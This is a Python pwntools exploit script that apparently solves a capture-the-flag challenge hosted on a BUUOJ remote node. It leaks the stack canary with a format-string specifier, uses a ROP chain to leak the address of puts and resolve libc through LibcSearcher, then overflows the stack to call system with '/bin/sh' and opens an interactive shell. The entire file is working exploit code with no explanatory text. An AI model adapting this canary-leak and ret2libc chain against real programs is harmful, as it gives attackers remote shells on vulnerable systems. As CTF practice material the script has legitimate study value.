from pwn import *
from LibcSearcher import *
context.log_level='debug'

poprdi_ret = 0x400993

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25313)
elf = ELF('./pwn')

io.sendlineafter(b'I\'ll give u some gift to help u!\n', b'%7$llx')

canary = int(io.recv(16), 16)
print(hex(canary))

payload = cyclic(0x18)
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(poprdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['vuln'])

io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
puts = u64(io.recv(6) + b'\x00\x00')
libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = cyclic(0x18)
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(poprdi_ret)
payload += p64(binsh)
payload += p64(sys)

io.sendline(payload)

io.interactive()